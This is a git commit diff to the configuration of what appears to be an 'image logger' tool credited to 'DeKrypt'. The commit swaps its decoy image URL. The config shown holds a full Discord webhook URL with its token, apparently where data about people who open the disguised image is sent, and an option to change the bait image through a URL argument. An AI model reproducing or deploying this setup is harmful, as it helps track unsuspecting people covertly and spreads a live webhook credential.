8b5123b8cc9fd93abd0c585396ab92d8b5dada9b
doguiaste <143461390+doguiaste@users.noreply.github.com>
2025-07-03 07:41:18 +0300

    Update main.py

--- api/main.py
+++ api/main.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1389020365992235019/CADc45AAyEbtFhe77v_u7fnw691vcOIQlFV5Tk3WYDTR1FnyZ8yuvr-pG7S5J7Z2xvdq",
-    "image": "https://tenor.com/view/emote-gif-7076440976315502411", # You can also have a custom image by using a URL argument
+    "image": "https://c.tenor.com/YjSRk0tNz0sAAAAd/tenor.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
